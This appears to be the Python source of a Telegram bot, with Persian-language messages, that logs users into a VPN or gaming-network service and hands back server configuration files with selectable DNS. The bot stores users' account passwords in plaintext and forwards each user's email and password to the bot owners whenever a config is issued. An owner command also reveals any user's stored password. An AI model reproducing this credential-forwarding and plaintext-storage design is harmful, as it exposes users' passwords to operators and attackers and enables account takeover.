import logging
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ConversationHandler

from core.texts import TEXTS
from core.config_loader import DBH, CFG, DNS_LIST
from core.db import *
from core.radargame_core import *

# logging.basicConfig(level=logging.INFO)
USERNAME, PASSWORD = range(2)

# === Get All Users ===
async def show_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in CFG["OWNERS"]:
        return

    args = context.args
    if args:
        try:
            user_id = int(args[0])
        except ValueError:
            await update.message.reply_text("شناسه کاربر نامعتبر است ❌")
            return

        user = DBH.get_all_user_info(user_id)
        if user:
            uid, username, password, created_at = user
            await update.message.reply_text(
                f"✅ <b>اطلاعات کاربر دریافت شد:</b>\n"
                f"🆔 <b>آیدی تلگرام:</b> <code>{uid}</code>\n"
                f"📧 <b>ایمیل اکانت:</b> <code>{username}</code>\n"
                f"🔐 <b>رمز عبور اکانت:</b> <code>{password}</code>\n"
                f"🕒 <b>زمان ثبت نام:</b> <code>{created_at}</code>",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text("کاربری با این آیدی یافت نشد ❌")
        return

    users = DBH.get_all_users()
    if not users:
        await update.message.reply_text("هیچ کاربری یافت نشد ❌")
        return

    msg = f"📊 تعداد کل کاربران: {len(users)}\n\n"
    msg += "\n".join([f"<code>{uid}</code> - {uname}" for uid, uname in users])
    await update.message.reply_text(msg[:4096], parse_mode="HTML")  # Telegram max message size

# === BroadCast ===
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in CFG["OWNERS"]:
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("برای استفاده از این دستور باید آنرا روی یک پیام ریپلای بزنید!")
        return

    users = DBH.get_all_users()
    sent, failed = 0, 0
    await update.message.reply_text(f"📢 در حال شروع ارسال به کاربران...")
    for user_id, _ in users:
        try:
            await context.bot.copy_message(chat_id=user_id,
                                           from_chat_id=update.message.chat_id,
                                           message_id=update.message.reply_to_message.message_id)
            sent += 1
        except Exception as e:
            print(f"Failed to send to {user_id}: {e}")
            failed += 1

    await update.message.reply_text(f"📢 پیام ارسال شد.\n✅ موفق: {sent}\n❌ ناموفق: {failed}")

# === Start Command ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = DBH.get_user(user_id)

    if user:
        context.user_data["username"] = user[0]
        context.user_data["token"] = get_token(user[0], user[1])
        if context.user_data["token"]:
            await update.message.reply_text(TEXTS["login_success"])
            await update.message.reply_text(f"<b>آیدی تلگرام:</b><pre>{user_id}</pre>\n<b>ایمیل شما: </b><pre>{user[0]}</pre>", parse_mode="HTML")
            return await show_servers(update, context)

    await update.message.reply_text(TEXTS["ask_username"])
    return USERNAME

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(TEXTS["help_text"], parse_mode="HTML")
    return

# === Username Handler ===
async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["username"] = update.message.text
    await update.message.reply_text(TEXTS["ask_password"])
    return PASSWORD

# === Password Handler ===
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text
    try:
        await update.message.delete()
    except:
        pass
    username = context.user_data["username"]

    token = get_token(username, password)
    if not token:
        await update.message.reply_text(TEXTS["login_fail"])
        return ConversationHandler.END

    DBH.save_user(user_id, username, password)
    context.user_data["token"] = token
    await update.message.reply_text(TEXTS["login_success"])
    return await show_servers(update, context)

# === Server Selection ===
async def show_servers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    servers = get_servers(context.user_data["token"])
    if not servers:
        await update.message.reply_text(TEXTS["no_server"])
        return ConversationHandler.END

    # Sort servers by loadPercentage (ascending)
    servers.sort(key=lambda s: s.get("loadPercentage", 100))

    keyboard = [
        [InlineKeyboardButton(f"{s['location']} - Load {s['loadPercentage']}%", callback_data=str(s['id']))]
        for s in servers
    ]
    await update.message.reply_text(TEXTS["choose_server"], reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

# === Callback (Server Selected) ===
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("dns_"):
        # DNS selected
        try:
            dns_idx = int(data.split("dns_")[1])
            dns_list = context.user_data.get('dns_list', [])
            
            if not dns_list or dns_idx >= len(dns_list):
                raise ValueError("Invalid DNS selection")
                
            selected_dns = dns_list[dns_idx]
            
            # Store DNS in user data
            server_id = context.user_data.get("server_id")
        except Exception as e:
            print(f"Error processing DNS selection: {e}")
            await query.edit_message_text("خطا در پردازش انتخاب DNS")
            return

        creds = DBH.get_user(query.from_user.id)
        if not creds:
            await query.edit_message_text(TEXTS["error"])
            return

        username, password = creds
        token = get_token(username, password)
        config = get_config(token, server_id)
        if not config:
            await query.edit_message_text(TEXTS["error"])
            return

        config["primary_dns"] = selected_dns['primary']
        config["secondary_dns"] = selected_dns['secondary']
        file_path = build_config_file(config)
        await query.edit_message_text(TEXTS["config_saved"])

        # Send config as text message
        with open(file_path, "r", encoding="utf-8") as f:
            config_text = f.read()
        await query.message.reply_text(f"<pre>{config_text}</pre>", parse_mode="HTML")

        # Send config as file
        await query.message.reply_document(InputFile(open(file_path, "rb")))

        # Warning text
        await query.message.reply_text(TEXTS["warning_text_1"], parse_mode="HTML")

        # Notify owner
        for owner_id in CFG["OWNERS"]:
            try:
                msg = (
                    f"🆕 <b>کاربری با مشخصات زیر کانفیگ دریافت کرد</b>\n"
                    f"👤 <b>آیدی تلگرام:</b> <code>{query.from_user.id}</code>\n"
                    f"👤 <b>اسم اکانت تلگرام:</b> {query.from_user.full_name}\n"
                    f"👤 <b>یوزرنیم تلگرام:</b> @{query.from_user.username}\n"
                    f"📧 <b>ایمیل اکانت:</b> <code>{username}</code>\n"
                    f"🔐 <b>رمز عبور اکانت:</b> <code>{password}</code>"
                )
                await context.bot.send_message(chat_id=owner_id, text=msg, parse_mode="HTML")
            except Exception as e:
                print(f"Failed to notify owner: {e}")
        return

    # Otherwise, it's server selection
    context.user_data["server_id"] = data
    
    try:
        with open('config/custom_dns.json', 'r', encoding='utf-8') as f:
            dns_config = json.load(f)
            dns_list = dns_config.get('dns_list', [])
            
        # Store DNS list in context for later use
        context.user_data['dns_list'] = dns_list
            
        keyboard = [
            [InlineKeyboardButton(
                d["name"], 
                callback_data=f"dns_{idx}"  # Just send the index
            )]
            for idx, d in enumerate(dns_list)
        ]
        await query.edit_message_text(TEXTS["dns_selection"], reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        print(f"Error loading DNS config: {e}")
        await query.edit_message_text("خطا در بارگذاری لیست دی ان اس ها")

# === Main Init ===
def main():
    app = ApplicationBuilder().token(CFG["BOT_TOKEN"]).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("help", help)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[]
    )

    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("users", show_all_users))
    app.add_handler(CommandHandler("broadcast", broadcast))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
